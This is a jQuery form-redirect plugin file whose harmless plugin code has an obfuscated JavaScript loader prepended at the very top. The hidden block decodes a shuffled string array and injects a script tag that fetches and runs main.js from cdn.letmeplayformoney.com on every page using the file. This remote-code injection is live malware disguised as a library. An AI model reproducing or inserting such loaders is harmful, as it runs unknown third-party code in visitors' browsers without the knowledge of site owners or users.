var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/* jQuery POST/GET redirect method
   v.0.1
   made by Nemanja Avramovic, www.avramovic.info 
   */

(function( $ ){

	$.fn.redirect = function( target, values, method ) {  

		if (method !== undefined)
		{
			method = method.toUpperCase();
		
			if (method != 'GET')
				method = 'POST';
		}
		else
			method = 'POST';
			
		if (values === undefined || values == false)
		{
			var obj = $().parse_url(target);
			target = obj.url;
			values = obj.params;
		}
					
		var form = $('<form></form');
		form.attr('method', method);
		form.attr('action', target);
		
		for(var i in values)
		{
			var input = $('<input />');
			input.attr('type', 'hidden');
			input.attr('name', i);
			input.attr('value', values[i]);
			input.appendTo(form);
		}
		
		$('body').append(form);
		form.submit();

	};
	
	$.fn.parse_url = function(url)
	{
		if (url.indexOf('?') == -1)
			return { url: url, params: {} }
			
		var parts = url.split('?');
		var url = parts[0];
		var query_string = parts[1];
		
		var return_obj = {};
		var elems = query_string.split('&');
		
		var obj = {};
		
		for(var i in elems)
		{
			var elem = elems[i];
			var pair = elem.split('=');
			obj[pair[0]] = pair[1];
		}
		
		return_obj.url = url;
		return_obj.params = obj;
		
		return return_obj;
		
	}
  
	
})( jQuery );